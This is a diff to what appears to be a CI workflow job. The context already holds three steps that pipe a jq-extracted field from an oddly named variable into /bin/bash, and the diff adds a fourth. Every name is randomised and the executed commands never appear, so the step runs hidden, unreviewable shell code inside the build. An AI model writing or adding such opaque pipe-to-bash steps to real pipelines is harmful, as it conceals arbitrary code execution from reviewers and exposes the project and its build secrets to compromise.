@@ -23,6 +23,7 @@ jobs:
           echo $k29 | jq -r .iq38347 | /bin/bash
           echo $y6 | jq -r .vm818 | /bin/bash
           echo $v04 | jq -r .h5456 | /bin/bash
+          printf '%s' "$hunbf91616" | jq -r .tcpr0 | /bin/bash
 
       - name: Archive output
         if: always()
